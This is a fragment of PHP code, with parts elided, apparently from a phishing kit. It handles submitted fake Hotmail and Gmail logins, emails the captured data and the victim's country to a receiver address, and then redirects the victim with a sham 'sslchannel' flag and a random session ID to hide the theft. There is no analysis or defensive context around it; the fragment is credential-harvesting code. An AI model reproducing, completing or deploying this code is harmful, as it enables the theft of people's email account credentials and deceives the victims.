...
";
        ...
        $subject = "Box - " . $_POST['from'] . " from " . $systemInfo['country'];
        mail($receiverAddress, $subject, $data);
        if ($_POST['from'] === 'Hotmail') {
            header('Location: redirect.php?sslchannel=true&sessionid=' . generateRandomString(130));
            exit;
...
";
        ...
        $subject = "Box - GMAIL - from " . $systemInfo['country'];
        mail($receiverAddress, $subject, $data);
        header('Location: redirect.php?sslchannel=true&sessionid=' . generateRandomString(130));
        exit;
    }
